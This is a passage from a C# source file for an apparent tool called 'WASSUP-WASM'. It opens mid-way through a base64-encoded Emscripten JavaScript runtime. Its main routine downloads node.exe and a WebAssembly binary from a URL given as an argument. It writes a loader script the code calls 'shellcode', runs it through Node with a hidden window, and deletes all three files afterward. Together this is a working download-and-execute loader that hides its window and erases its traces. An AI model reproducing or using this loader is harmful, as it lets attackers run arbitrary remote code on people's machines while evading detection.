HNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiYWxsb2NhdGVVVEY4IikpIE1vZHVsZVsiYWxsb2NhdGVVVEY4Il0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidhbGxvY2F0ZVVURjgnIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQppZiAoIU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoTW9kdWxlLCAiYWxsb2NhdGVVVEY4T25TdGFjayIpKSBNb2R1bGVbImFsbG9jYXRlVVRGOE9uU3RhY2siXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ2FsbG9jYXRlVVRGOE9uU3RhY2snIHdhcyBub3QgZXhwb3J0ZWQuIGFkZCBpdCB0byBFWFRSQV9FWFBPUlRFRF9SVU5USU1FX01FVEhPRFMgKHNlZSB0aGUgRkFRKSIpIH07DQpNb2R1bGVbIndyaXRlU3RhY2tDb29raWUiXSA9IHdyaXRlU3RhY2tDb29raWU7DQpNb2R1bGVbImNoZWNrU3RhY2tDb29raWUiXSA9IGNoZWNrU3RhY2tDb29raWU7aWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgIkFMTE9DX05PUk1BTCIpKSBPYmplY3QuZGVmaW5lUHJvcGVydHkoTW9kdWxlLCAiQUxMT0NfTk9STUFMIiwgeyBjb25maWd1cmFibGU6IHRydWUsIGdldDogZnVuY3Rpb24oKSB7IGFib3J0KCInQUxMT0NfTk9STUFMJyB3YXMgbm90IGV4cG9ydGVkLiBhZGQgaXQgdG8gRVhUUkFfRVhQT1JURURfUlVOVElNRV9NRVRIT0RTIChzZWUgdGhlIEZBUSkiKSB9IH0pOw0KaWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgIkFMTE9DX1NUQUNLIikpIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShNb2R1bGUsICJBTExPQ19TVEFDSyIsIHsgY29uZmlndXJhYmxlOiB0cnVlLCBnZXQ6IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ0FMTE9DX1NUQUNLJyB3YXMgbm90IGV4cG9ydGVkLiBhZGQgaXQgdG8gRVhUUkFfRVhQT1JURURfUlVOVElNRV9NRVRIT0RTIChzZWUgdGhlIEZBUSkiKSB9IH0pOw0KaWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgIkFMTE9DX0RZTkFNSUMiKSkgT2JqZWN0LmRlZmluZVByb3BlcnR5KE1vZHVsZSwgIkFMTE9DX0RZTkFNSUMiLCB7IGNvbmZpZ3VyYWJsZTogdHJ1ZSwgZ2V0OiBmdW5jdGlvbigpIHsgYWJvcnQoIidBTExPQ19EWU5BTUlDJyB3YXMgbm90IGV4cG9ydGVkLiBhZGQgaXQgdG8gRVhUUkFfRVhQT1JURURfUlVOVElNRV9NRVRIT0RTIChzZWUgdGhlIEZBUSkiKSB9IH0pOw0KaWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgIkFMTE9DX05PTkUiKSkgT2JqZWN0LmRlZmluZVByb3BlcnR5KE1vZHVsZSwgIkFMTE9DX05PTkUiLCB7IGNvbmZpZ3VyYWJsZTogdHJ1ZSwgZ2V0OiBmdW5jdGlvbigpIHsgYWJvcnQoIidBTExPQ19OT05FJyB3YXMgbm90IGV4cG9ydGVkLiBhZGQgaXQgdG8gRVhUUkFfRVhQT1JURURfUlVOVElNRV9NRVRIT0RTIChzZWUgdGhlIEZBUSkiKSB9IH0pOw0KDQoNCg0KdmFyIGNhbGxlZFJ1bjsNCg0KLyoqDQogKiBAY29uc3RydWN0b3INCiAqIEB0aGlzIHtFeGl0U3RhdHVzfQ0KICovDQpmdW5jdGlvbiBFeGl0U3RhdHVzKHN0YXR1cykgew0KICB0aGlzLm5hbWUgPSAiRXhpdFN0YXR1cyI7DQogIHRoaXMubWVzc2FnZSA9ICJQcm9ncmFtIHRlcm1pbmF0ZWQgd2l0aCBleGl0KCIgKyBzdGF0dXMgKyAiKSI7DQogIHRoaXMuc3RhdHVzID0gc3RhdHVzOw0KfQ0KDQp2YXIgY2FsbGVkTWFpbiA9IGZhbHNlOw0KDQoNCmRlcGVuZGVuY2llc0Z1bGZpbGxlZCA9IGZ1bmN0aW9uIHJ1bkNhbGxlcigpIHsNCiAgLy8gSWYgcnVuIGhhcyBuZXZlciBiZWVuIGNhbGxlZCwgYW5kIHdlIHNob3VsZCBjYWxsIHJ1biAoSU5WT0tFX1JVTiBpcyB0cnVlLCBhbmQgTW9kdWxlLm5vSW5pdGlhbFJ1biBpcyBub3QgZmFsc2UpDQogIGlmICghY2FsbGVkUnVuKSBydW4oKTsNCiAgaWYgKCFjYWxsZWRSdW4pIGRlcGVuZGVuY2llc0Z1bGZpbGxlZCA9IHJ1bkNhbGxlcjsgLy8gdHJ5IHRoaXMgYWdhaW4gbGF0ZXIsIGFmdGVyIG5ldyBkZXBzIGFyZSBmdWxmaWxsZWQNCn07DQoNCmZ1bmN0aW9uIGNhbGxNYWluKGFyZ3MpIHsNCiAgYXNzZXJ0KHJ1bkRlcGVuZGVuY2llcyA9PSAwLCAnY2Fubm90IGNhbGwgbWFpbiB3aGVuIGFzeW5jIGRlcGVuZGVuY2llcyByZW1haW4hIChsaXN0ZW4gb24gTW9kdWxlWyJvblJ1bnRpbWVJbml0aWFsaXplZCJdKScpOw0KICBhc3NlcnQoX19BVFBSRVJVTl9fLmxlbmd0aCA9PSAwLCAnY2Fubm90IGNhbGwgbWFpbiB3aGVuIHByZVJ1biBmdW5jdGlvbnMgcmVtYWluIHRvIGJlIGNhbGxlZCcpOw0KDQogIHZhciBlbnRyeUZ1bmN0aW9uID0gTW9kdWxlWydfbWFpbiddOw0KDQoNCiAgYXJncyA9IGFyZ3MgfHwgW107DQoNCiAgdmFyIGFyZ2MgPSBhcmdzLmxlbmd0aCsxOw0KICB2YXIgYXJndiA9IHN0YWNrQWxsb2MoKGFyZ2MgKyAxKSAqIDQpOw0KICBIRUFQMzJbYXJndiA+PiAyXSA9IGFsbG9jYXRlVVRGOE9uU3RhY2sodGhpc1Byb2dyYW0pOw0KICBmb3IgKHZhciBpID0gMTsgaSA8IGFyZ2M7IGkrKykgew0KICAgIEhFQVAzMlsoYXJndiA+PiAyKSArIGldID0gYWxsb2NhdGVVVEY4T25TdGFjayhhcmdzW2kgLSAxXSk7DQogIH0NCiAgSEVBUDMyWyhhcmd2ID4+IDIpICsgYXJnY10gPSAwOw0KDQogIHRyeSB7DQoNCiAgICBNb2R1bGVbJ19fX3NldF9zdGFja19saW1pdCddKFNUQUNLX01BWCk7DQoNCiAgICB2YXIgcmV0ID0gZW50cnlGdW5jdGlvbihhcmdjLCBhcmd2KTsNCg0KDQogICAgLy8gSW4gUFJPWFlfVE9fUFRIUkVBRCBidWlsZHMsIHdlIHNob3VsZCBuZXZlciBleGl0IHRoZSBydW50aW1lIGJlbG93LCBhcyBleGVjdXRpb24gaXMgYXN5bmNocm9ub3VzbHkgaGFuZGVkDQogICAgLy8gb2ZmIHRvIGEgcHRocmVhZC4NCiAgICAvLyBpZiB3ZSdyZSBub3QgcnVubmluZyBhbiBldmVudGVkIG1haW4gbG9vcCwgaXQncyB0aW1lIHRvIGV4aXQNCiAgICAgIGV4aXQocmV0LCAvKiBpbXBsaWNpdCA9ICovIHRydWUpOw0KICB9DQogIGNhdGNoKGUpIHsNCiAgICBpZiAoZSBpbnN0YW5jZW9mIEV4aXRTdGF0dXMpIHsNCiAgICAgIC8vIGV4aXQoKSB0aHJvd3MgdGhpcyBvbmNlIGl0J3MgZG9uZSB0byBtYWtlIHN1cmUgZXhlY3V0aW9uDQogICAgICAvLyBoYXMgYmVlbiBzdG9wcGVkIGNvbXBsZXRlbHkNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYgKGUgPT0gJ3Vud2luZCcpIHsNCiAgICAgIC8vIHJ1bm5pbmcgYW4gZXZlbnRlZCBtYWluIGxvb3AsIGRvbid0IGltbWVkaWF0ZWx5IGV4aXQNCiAgICAgIG5vRXhpdFJ1bnRpbWUgPSB0cnVlOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSB7DQogICAgICB2YXIgdG9Mb2cgPSBlOw0KICAgICAgaWYgKGUgJiYgdHlwZW9mIGUgPT09ICdvYmplY3QnICYmIGUuc3RhY2spIHsNCiAgICAgICAgdG9Mb2cgPSBbZSwgZS5zdGFja107DQogICAgICB9DQogICAgICBlcnIoJ2V4Y2VwdGlvbiB0aHJvd246ICcgKyB0b0xvZyk7DQogICAgICBxdWl0XygxLCBlKTsNCiAgICB9DQogIH0gZmluYWxseSB7DQogICAgY2FsbGVkTWFpbiA9IHRydWU7DQogIH0NCn0NCg0KDQoNCg0KLyoqIEB0eXBlIHtmdW5jdGlvbihBcnJheT0pfSAqLw0KZnVuY3Rpb24gcnVuKGFyZ3MpIHsNCiAgYXJncyA9IGFyZ3MgfHwgYXJndW1lbnRzXzsNCg0KICBpZiAocnVuRGVwZW5kZW5jaWVzID4gMCkgew0KICAgIHJldHVybjsNCiAgfQ0KDQogIHdyaXRlU3RhY2tDb29raWUoKTsNCg0KICBwcmVSdW4oKTsNCg0KICBpZiAocnVuRGVwZW5kZW5jaWVzID4gMCkgcmV0dXJuOyAvLyBhIHByZVJ1biBhZGRlZCBhIGRlcGVuZGVuY3ksIHJ1biB3aWxsIGJlIGNhbGxlZCBsYXRlcg0KDQogIGZ1bmN0aW9uIGRvUnVuKCkgew0KICAgIC8vIHJ1biBtYXkgaGF2ZSBqdXN0IGJlZW4gY2FsbGVkIHRocm91Z2ggZGVwZW5kZW5jaWVzIGJlaW5nIGZ1bGZpbGxlZCBqdXN0IGluIHRoaXMgdmVyeSBmcmFtZSwNCiAgICAvLyBvciB3aGlsZSB0aGUgYXN5bmMgc2V0U3RhdHVzIHRpbWUgYmVsb3cgd2FzIGhhcHBlbmluZw0KICAgIGlmIChjYWxsZWRSdW4pIHJldHVybjsNCiAgICBjYWxsZWRSdW4gPSB0cnVlOw0KICAgIE1vZHVsZVsnY2FsbGVkUnVuJ10gPSB0cnVlOw0KDQogICAgaWYgKEFCT1JUKSByZXR1cm47DQoNCiAgICBpbml0UnVudGltZSgpOw0KDQogICAgcHJlTWFpbigpOw0KDQogICAgaWYgKE1vZHVsZVsnb25SdW50aW1lSW5pdGlhbGl6ZWQnXSkgTW9kdWxlWydvblJ1bnRpbWVJbml0aWFsaXplZCddKCk7DQoNCiAgICBpZiAoc2hvdWxkUnVuTm93KSBjYWxsTWFpbihhcmdzKTsNCg0KICAgIHBvc3RSdW4oKTsNCiAgfQ0KDQogIGlmIChNb2R1bGVbJ3NldFN0YXR1cyddKSB7DQogICAgTW9kdWxlWydzZXRTdGF0dXMnXSgnUnVubmluZy4uLicpOw0KICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7DQogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgew0KICAgICAgICBNb2R1bGVbJ3NldFN0YXR1cyddKCcnKTsNCiAgICAgIH0sIDEpOw0KICAgICAgZG9SdW4oKTsNCiAgICB9LCAxKTsNCiAgfSBlbHNlDQogIHsNCiAgICBkb1J1bigpOw0KICB9DQogIGNoZWNrU3RhY2tDb29raWUoKTsNCn0NCk1vZHVsZVsncnVuJ10gPSBydW47DQoNCmZ1bmN0aW9uIGNoZWNrVW5mbHVzaGVkQ29udGVudCgpIHsNCiAgLy8gQ29tcGlsZXIgc2V0dGluZ3MgZG8gbm90IGFsbG93IGV4aXRpbmcgdGhlIHJ1bnRpbWUsIHNvIGZsdXNoaW5nDQogIC8vIHRoZSBzdHJlYW1zIGlzIG5vdCBwb3NzaWJsZS4gYnV0IGluIEFTU0VSVElPTlMgbW9kZSB3ZSBjaGVjaw0KICAvLyBpZiB0aGVyZSB3YXMgc29tZXRoaW5nIHRvIGZsdXNoLCBhbmQgaWYgc28gdGVsbCB0aGUgdXNlciB0aGV5DQogIC8vIHNob3VsZCByZXF1ZXN0IHRoYXQgdGhlIHJ1bnRpbWUgYmUgZXhpdGFibGUuDQogIC8vIE5vcm1hbGx5IHdlIHdvdWxkIG5vdCBldmVuIGluY2x1ZGUgZmx1c2goKSBhdCBhbGwsIGJ1dCBpbiBBU1NFUlRJT05TDQogIC8vIGJ1aWxkcyB3ZSBkbyBzbyBqdXN0IGZvciB0aGlzIGNoZWNrLCBhbmQgaGVyZSB3ZSBzZWUgaWYgdGhlcmUgaXMgYW55DQogIC8vIGNvbnRlbnQgdG8gZmx1c2gsIHRoYXQgaXMsIHdlIGNoZWNrIGlmIHRoZXJlIHdvdWxkIGhhdmUgYmVlbg0KICAvLyBzb21ldGhpbmcgYSBub24tQVNTRVJUSU9OUyBidWlsZCB3b3VsZCBoYXZlIG5vdCBzZWVuLg0KICAvLyBIb3cgd2UgZmx1c2ggdGhlIHN0cmVhbXMgZGVwZW5kcyBvbiB3aGV0aGVyIHdlIGFyZSBpbiBTWVNDQUxMU19SRVFVSVJFX0ZJTEVTWVNURU09MA0KICAvLyBtb2RlICh3aGljaCBoYXMgaXRzIG93biBzcGVjaWFsIGZ1bmN0aW9uIGZvciB0aGlzOyBvdGhlcndpc2UsIGFsbA0KICAvLyB0aGUgY29kZSBpcyBpbnNpZGUgbGliYykNCiAgdmFyIHByaW50ID0gb3V0Ow0KICB2YXIgcHJpbnRFcnIgPSBlcnI7DQogIHZhciBoYXMgPSBmYWxzZTsNCiAgb3V0ID0gZXJyID0gZnVuY3Rpb24oeCkgew0KICAgIGhhcyA9IHRydWU7DQogIH0NCiAgdHJ5IHsgLy8gaXQgZG9lc24ndCBtYXR0ZXIgaWYgaXQgZmFpbHMNCiAgICB2YXIgZmx1c2ggPSBNb2R1bGVbJ19mZmx1c2gnXTsNCiAgICBpZiAoZmx1c2gpIGZsdXNoKDApOw0KICAgIC8vIGFsc28gZmx1c2ggaW4gdGhlIEpTIEZTIGxheWVyDQogICAgWydzdGRvdXQnLCAnc3RkZXJyJ10uZm9yRWFjaChmdW5jdGlvbihuYW1lKSB7DQogICAgICB2YXIgaW5mbyA9IEZTLmFuYWx5emVQYXRoKCcvZGV2LycgKyBuYW1lKTsNCiAgICAgIGlmICghaW5mbykgcmV0dXJuOw0KICAgICAgdmFyIHN0cmVhbSA9IGluZm8ub2JqZWN0Ow0KICAgICAgdmFyIHJkZXYgPSBzdHJlYW0ucmRldjsNCiAgICAgIHZhciB0dHkgPSBUVFkudHR5c1tyZGV2XTsNCiAgICAgIGlmICh0dHkgJiYgdHR5Lm91dHB1dCAmJiB0dHkub3V0cHV0Lmxlbmd0aCkgew0KICAgICAgICBoYXMgPSB0cnVlOw0KICAgICAgfQ0KICAgIH0pOw0KICB9IGNhdGNoKGUpIHt9DQogIG91dCA9IHByaW50Ow0KICBlcnIgPSBwcmludEVycjsNCiAgaWYgKGhhcykgew0KICAgIHdhcm5PbmNlKCdzdGRpbyBzdHJlYW1zIGhhZCBjb250ZW50IGluIHRoZW0gdGhhdCB3YXMgbm90IGZsdXNoZWQuIHlvdSBzaG91bGQgc2V0IEVYSVRfUlVOVElNRSB0byAxIChzZWUgdGhlIEZBUSksIG9yIG1ha2Ugc3VyZSB0byBlbWl0IGEgbmV3bGluZSB3aGVuIHlvdSBwcmludGYgZXRjLicpOw0KICB9DQp9DQoNCi8qKiBAcGFyYW0ge2Jvb2xlYW58bnVtYmVyPX0gaW1wbGljaXQgKi8NCmZ1bmN0aW9uIGV4aXQoc3RhdHVzLCBpbXBsaWNpdCkgew0KICBjaGVja1VuZmx1c2hlZENvbnRlbnQoKTsNCg0KICAvLyBpZiB0aGlzIGlzIGp1c3QgbWFpbiBleGl0LWluZyBpbXBsaWNpdGx5LCBhbmQgdGhlIHN0YXR1cyBpcyAwLCB0aGVuIHdlDQogIC8vIGRvbid0IG5lZWQgdG8gZG8gYW55dGhpbmcgaGVyZSBhbmQgY2FuIGp1c3QgbGVhdmUuIGlmIHRoZSBzdGF0dXMgaXMNCiAgLy8gbm9uLXplcm8sIHRob3VnaCwgdGhlbiB3ZSBuZWVkIHRvIHJlcG9ydCBpdC4NCiAgLy8gKHdlIG1heSBoYXZlIHdhcm5lZCBhYm91dCB0aGlzIGVhcmxpZXIsIGlmIGEgc2l0dWF0aW9uIGp1c3RpZmllcyBkb2luZyBzbykNCiAgaWYgKGltcGxpY2l0ICYmIG5vRXhpdFJ1bnRpbWUgJiYgc3RhdHVzID09PSAwKSB7DQogICAgcmV0dXJuOw0KICB9DQoNCiAgaWYgKG5vRXhpdFJ1bnRpbWUpIHsNCiAgICAvLyBpZiBleGl0KCkgd2FzIGNhbGxlZCwgd2UgbWF5IHdhcm4gdGhlIHVzZXIgaWYgdGhlIHJ1bnRpbWUgaXNuJ3QgYWN0dWFsbHkgYmVpbmcgc2h1dCBkb3duDQogICAgaWYgKCFpbXBsaWNpdCkgew0KICAgICAgdmFyIG1zZyA9ICdwcm9ncmFtIGV4aXRlZCAod2l0aCBzdGF0dXM6ICcgKyBzdGF0dXMgKyAnKSwgYnV0IEVYSVRfUlVOVElNRSBpcyBub3Qgc2V0LCBzbyBoYWx0aW5nIGV4ZWN1dGlvbiBidXQgbm90IGV4aXRpbmcgdGhlIHJ1bnRpbWUgb3IgcHJldmVudGluZyBmdXJ0aGVyIGFzeW5jIGV4ZWN1dGlvbiAoYnVpbGQgd2l0aCBFWElUX1JVTlRJTUU9MSwgaWYgeW91IHdhbnQgYSB0cnVlIHNodXRkb3duKSc7DQogICAgICBlcnIobXNnKTsNCiAgICB9DQogIH0gZWxzZSB7DQoNCiAgICBBQk9SVCA9IHRydWU7DQogICAgRVhJVFNUQVRVUyA9IHN0YXR1czsNCg0KICAgIGV4aXRSdW50aW1lKCk7DQoNCiAgICBpZiAoTW9kdWxlWydvbkV4aXQnXSkgTW9kdWxlWydvbkV4aXQnXShzdGF0dXMpOw0KICB9DQoNCiAgcXVpdF8oc3RhdHVzLCBuZXcgRXhpdFN0YXR1cyhzdGF0dXMpKTsNCn0NCg0KaWYgKE1vZHVsZVsncHJlSW5pdCddKSB7DQogIGlmICh0eXBlb2YgTW9kdWxlWydwcmVJbml0J10gPT0gJ2Z1bmN0aW9uJykgTW9kdWxlWydwcmVJbml0J10gPSBbTW9kdWxlWydwcmVJbml0J11dOw0KICB3aGlsZSAoTW9kdWxlWydwcmVJbml0J10ubGVuZ3RoID4gMCkgew0KICAgIE1vZHVsZVsncHJlSW5pdCddLnBvcCgpKCk7DQogIH0NCn0NCg0KLy8gc2hvdWxkUnVuTm93IHJlZmVycyB0byBjYWxsaW5nIG1haW4oKSwgbm90IHJ1bigpLg0KdmFyIHNob3VsZFJ1bk5vdyA9IHRydWU7DQoNCmlmIChNb2R1bGVbJ25vSW5pdGlhbFJ1biddKSBzaG91bGRSdW5Ob3cgPSBmYWxzZTsNCg0KDQogIG5vRXhpdFJ1bnRpbWUgPSB0cnVlOw0KDQpydW4oKTs=";

        byte[] base64Decoded1 = Convert.FromBase64String(js1);
        byte[] base64Decoded2 = Convert.FromBase64String(js2);

        string data1  = System.Text.ASCIIEncoding.ASCII.GetString(base64Decoded1);
        string data2  = System.Text.ASCIIEncoding.ASCII.GetString(base64Decoded2);

        string shellcode = data1 + filename + data2;

        File.WriteAllText("wasm.js", shellcode);
    }

    static void Main(string[] args)
    {
        if (args.Length == 0)
        {
            System.Console.WriteLine("\nSyntax:\n WASSUP-WASM.exe <URL to download the .WASM binary>");
            return;
        }

        //Download latest node.exe from the link below
        string http = "https://nodejs.org/download/release/latest-v9.x/win-x64/node.exe";
        //Link of the WebAssembly binary
        string wasmfilename = args[0];

        string wasm = "wasm.wasm";

        //Download latest node.exe and save it as node.exe
        var client1 = new WebClient();
        client1.DownloadFile(http, "node.exe");

        //Download WebAssembly binary and save it as "wasm.wasm"
        var client2 = new WebClient();
        client2.DownloadFile(wasmfilename, wasm);

        //Create a JavaScript file to execute the WASM binary
        jsc(wasm);

        //Get the path of "node.exe'
        string path = Directory.GetCurrentDirectory();
        string node = Path.Combine(path, "node.exe");

        //Execute "node.exe" with "wasm.js" as it's argument
        System.Diagnostics.Process process = new System.Diagnostics.Process();
        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
        startInfo.FileName = node; //Path of node.exe
        startInfo.Arguments = "wasm.js"; //JS file that executes "wasm.wasm"
        process.StartInfo = startInfo;
        process.Start();
        process.WaitForExit();

        System.IO.File.Delete("node.exe");
        System.IO.File.Delete("wasm.js");
        System.IO.File.Delete(wasm);

    }
}